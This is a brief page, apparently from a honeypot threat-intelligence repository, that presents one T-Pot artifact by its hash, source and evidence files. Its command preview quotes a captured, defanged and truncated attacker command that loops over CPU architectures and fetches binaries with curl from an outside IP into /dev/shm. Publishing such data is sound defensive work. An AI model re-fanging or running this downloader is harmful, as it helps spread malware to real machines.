# 2a924709fb52d53ce5b282b855c54475afc0ed788b7bdc23faa078800cbe5e56

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `2a924709fb52d53ce5b282b855c54475afc0ed788b7bdc23faa078800cbe5e56` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
[4hroot@ubnt:~# cd /dev/shm; for arch in x86_64 armv7l mips mipsel; do curl -fsSLk hxxp://103[.]211[.]206[.]XXX/main_${arch} -o
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
